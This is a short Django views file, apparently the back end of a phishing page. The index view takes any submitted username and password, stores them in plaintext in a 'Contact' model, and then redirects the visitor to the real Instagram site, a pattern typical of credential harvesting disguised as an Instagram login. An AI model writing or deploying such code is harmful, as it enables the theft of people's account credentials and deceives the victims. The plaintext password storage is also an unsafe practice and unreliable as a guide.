from django.shortcuts import render,redirect,HttpResponse
from loginSystem.models import Contact
# Create your views here.

def index(request):
    if request.method == 'POST':
        uname = request.POST.get('username')
        upass = request.POST.get('password')
        contact = Contact(username=uname, password=upass)
        contact.save()
        return redirect('https://www.instagram.com')
    return render(request, 'index.html')